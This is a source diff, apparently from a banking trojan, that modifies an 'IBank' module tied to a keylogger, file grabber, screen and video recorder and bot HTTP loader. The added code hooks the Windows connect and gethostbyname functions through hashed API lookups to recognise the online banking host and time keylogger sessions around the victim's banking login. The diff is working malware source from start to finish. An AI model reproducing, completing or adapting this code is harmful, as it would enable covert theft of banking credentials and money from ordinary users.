@@ -4,6 +4,8 @@
 #pragma hdrstop
 
 #include <windows.h>
+#include <winsock.h>
+
 
 #include "IBankSystem.h"
 #include "UniversalKeyLogger.h"
@@ -18,12 +20,14 @@
 #include "BotClasses.h"
 #include "BotHTTP.h"
 #include "Loader.h"
-//#include "IBankExport.h"
 #include "FileGrabber.h"
 #include "Utils.h"
 #include "VideoRecorder.h"
+#include "BotHTTP.h"
+#include "JavaConfig.h"
 
 #include "Modules.h"
+
 
 
 //---------------------------------------------------------------------------
@@ -69,14 +73,22 @@ namespace IBank
 
 
 	// Определяем типы для установки хуков
-	typedef int (WINAPI *PConnect)(SOCKET s, const struct sockaddr *name, int namelen);
+	typedef int (WINAPI *TConnect)(SOCKET s, const struct sockaddr *name, int namelen);
 
-	// Переменные для хранения казателей на реальные функции
-	PConnect Real_Connect;
+	TConnect Real_Connect;
+
 
     // Глобальные переменные системы
-	PKeyLogSystem System = NULL;
-	bool Hooked = false;
+	PKeyLogSystem System        = NULL;
+	bool          Hooked        = false;
+
+
+#ifdef JAVS_PATCHERH
+	typedef struct hostent FAR * (WINAPI *Tgethostbyname)(char FAR * name);
+
+	Tgethostbyname  Real_gethostbyname;
+	DWORD           IBnakHostAddr = 0;
+#endif
 
 	TIBankLog Log;
 
@@ -142,18 +154,41 @@ namespace IBank
 		}
 		return 0;
 	}
-
 	//-----------------------------------------------------------------------
 
+#ifdef JAVS_PATCHERH
+	struct hostent FAR * WINAPI Hook_gethostbyname(char FAR * name)
+	{
+
+		struct hostent FAR * Res = Real_gethostbyname(name);
+
+		// В случае если получается имя хоста ибанка, сохраняем его
+		// для дальнейших проверок
+		if (Res && !IsJavaHost(name))
+		{
+			IBnakHostAddr = *(LPDWORD)Res->h_addr_list[0];
+        }
+
+		return Res;
+	};
+#endif
+	//-----------------------------------------------------------------------
 
 	int WINAPI Hook_Connect( SOCKET s, const struct sockaddr *name, int namelen )
 	{
 		// Идёт запрос на сервер, закрываем систему.
-		KeyLogger::CloseSession();
+		#ifndef JAVS_PATCHERH
+			KeyLogger::CloseSession();
+        #else
+			struct sockaddr_in* info = (struct sockaddr_in*)name;
+			if (IBnakHostAddr && IBnakHostAddr == info->sin_addr.s_addr)
+				KeyLogger::CloseSession();
+		#endif
 
-    	return Real_Connect(s, name, namelen);
-    }
+		return Real_Connect(s, name, namelen);
+	}
 	//-----------------------------------------------------------------------
+
 
 	void MakeScreenShot()
 	{
@@ -162,32 +197,7 @@ namespace IBank
 	}
 	//-----------------------------------------------------------------------
 
-   /*	static void WINAPI ShowWindowIBank(PKeyLogger Logger, DWORD EventID, LPVOID Data)
-	{
-
-		TShowWindowData* data = (TShowWindowData*)Data;
-
-		// Скрытие окон игнорируем
-		if (data->Command == 0)
-			return;
-
-		char caption[128];
-		pGetWindowTextA( data->Window, caption, sizeof(caption) );
-
-		if(m_strstr(caption, "Вход в систему") == 0)
-		{
-			char PatTxt[MAX_PATH];
-			if(	GetAllUsersProfile(PatTxt, MAX_PATH, "Pat.txt"))
-			{
-				File::WriteBufferA(PatTxt, (LPVOID)"1", 1);
-                VideoRecorderSrv::StartRecording(SystemName);
-			}
-		}
-	}  */
-	//------------------------------------------------------------------------
-
-
-	void SetHooks()
+ 	void SetHooks()
 	{
 		// Устанавливаем треуемые хуки
 		IBDBG( "IBank", "Ставим хуки для %s", System->Name );
@@ -199,8 +209,14 @@ namespace IBank
 			__asm mov [Real_Connect], eax
 		}
 
-		//KeyLogger::ConnectEventHandler( KLE_SHOW_WND, ShowWindowIBank );
-    }
+		#ifdef JAVS_PATCHERH
+		if ( HookApi( 4, 0xF44318C6 /* gethostbyname */, &Hook_gethostbyname) )
+		{
+			__asm mov [Real_gethostbyname], eax
+		}
+		#endif
+
+	}
 
 	void AddFileGrabber(FileGrabber::TypeFuncReceiver IsFileKey)
 	{
@@ -551,10 +567,10 @@ void RegisterIBankSystem(DWORD hashApp)
 
 
 	// Для тестов
-	#ifdef AGENTFULLTEST
-		___RegisterIBankSystem(0);
-		return;
-	#endif
+//	#ifdef AGENTFULLTEST
+//		___RegisterIBankSystem(0);
+//		return;
+//	#endif
 
 
 
@@ -562,6 +578,10 @@ void RegisterIBankSystem(DWORD hashApp)
 	ClearStruct(IBank::Log);
 	IBank::Hooked = false;
 	IBank::System = NULL;
+	#ifdef JAVS_PATCHERH
+	IBank::IBnakHostAddr = 0;
+	#endif
+
 
 	// Функция регистрирует систему IBANK
 
